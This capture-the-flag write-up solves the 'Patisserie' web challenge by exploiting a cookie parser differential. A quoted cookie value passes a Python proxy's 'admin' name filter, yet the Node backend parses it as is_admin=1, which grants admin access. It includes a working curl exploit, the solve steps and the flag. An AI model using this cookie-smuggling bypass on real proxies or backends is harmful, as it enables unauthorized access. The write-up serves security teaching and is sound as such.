# Patisserie Writeup

## Challenge Info

- Challenge: `Patisserie`
- Category: `Web`
- Author: `kq5y`
- Points when solved locally: `151 pts`
- Solves shown in prompt: `39 solves`
- Flag format: `tkbctf{...}`
- Target: `http://35.194.108.145:20654`

## Summary

The challenge is a small web app behind a Flask proxy. The backend Express app protects `/admin` by checking for a cookie named `is_admin=1`. The Flask proxy tries to block any cookie whose name contains `admin` before forwarding the request.

The bug is a parser differential:

- The proxy uses Python `http.cookies.SimpleCookie`.
- The backend uses Node's `cookie` parser through `cookie-parser`.

A crafted quoted cookie value is parsed as a single harmless cookie by Python, but Node incorrectly splits it and creates `is_admin=1`. That gives admin access and reveals the flag.

## Files

The supplied archive extracts into:

- `patisserie/proxy/app.py`
- `patisserie/app/index.js`
- `patisserie/compose.yml`

## Source Analysis

### 1. Proxy behavior

In `patisserie/proxy/app.py`, all requests pass through `check_cookies()`:

```python
def check_cookies(cookie_header: str) -> str | None:
    cookie_header = cookie_header.strip()
    if not cookie_header:
        return None

    cookies = parse_cookie_header(cookie_header)
    if not cookies:
        return "malformed cookie"

    if len(cookies) > MAX_COOKIES:
        return "too many cookies"

    for name in cookies:
        if "admin" in name.lower():
            return "blocked cookie"

    return None
```

Important observations:

- The proxy only inspects cookie names after parsing.
- It blocks names containing `admin`.
- It forwards the original `Cookie` header if parsing succeeds.

### 2. Backend behavior

In `patisserie/app/index.js`, the admin panel is protected only by a plain cookie check:

```js
app.get("/admin", (req, res) => {
  if (req.cookies.is_admin === "1") {
    return res.send(/* flag page */);
  }
  ...
});
```

So we only need the backend to parse `is_admin=1`. We do not need the real admin password.

## Finding the Differential

The idea is to make Python see one cookie while Node sees two.

This cookie header works:

```http
Cookie: foo="bar; is_admin=1;"
```

Why:

- Python `SimpleCookie` accepts the quoted string as one cookie:

```python
{'foo': 'bar; is_admin=1;'}
```

- No cookie name contains `admin`, so the proxy allows the request.

- Node's cookie parser splits on semicolons without respecting the quoted value and effectively interprets:

```js
{ foo: '"bar', is_admin: '1' }
```

- The backend now sees `req.cookies.is_admin === "1"` and serves the admin page.

## Exploit

### One-line solve

```bash
curl -sS 'http://35.194.108.145:20654/admin' \
  -H 'Cookie: foo="bar; is_admin=1;"'
```

### Result

The response contains:

```html
<h2>Secret Recipe</h2>
<p>tkbctf{qu0t3d_c00k13_smuggl1ng_p4rs3r_d1ff_7d3f8a2b}</p>
```

## Full Solve Process

1. Open the challenge page and note `/admin`, `/recipes`, and `/search`.
2. Extract the provided source archive.
3. Read `patisserie/proxy/app.py` and notice the proxy filters cookie names containing `admin`.
4. Read `patisserie/app/index.js` and notice `/admin` trusts `req.cookies.is_admin === "1"`.
5. Test parser edge cases locally against Python `SimpleCookie` and Node's `cookie` package.
6. Find that a quoted cookie value containing `; is_admin=1;` is treated differently by the two parsers.
7. Send the crafted request directly to `/admin`.
8. Read the flag from the admin page.

## Root Cause

This is a classic parser differential / cookie smuggling issue:

- Security filtering happens in one layer.
- Authorization happens in another layer.
- The two layers do not parse the `Cookie` header the same way.

Any time a proxy, WAF, or middleware validates structured input differently from the backend that consumes it, this kind of bypass becomes possible.

## Flag

`tkbctf{qu0t3d_c00k13_smuggl1ng_p4rs3r_d1ff_7d3f8a2b}`
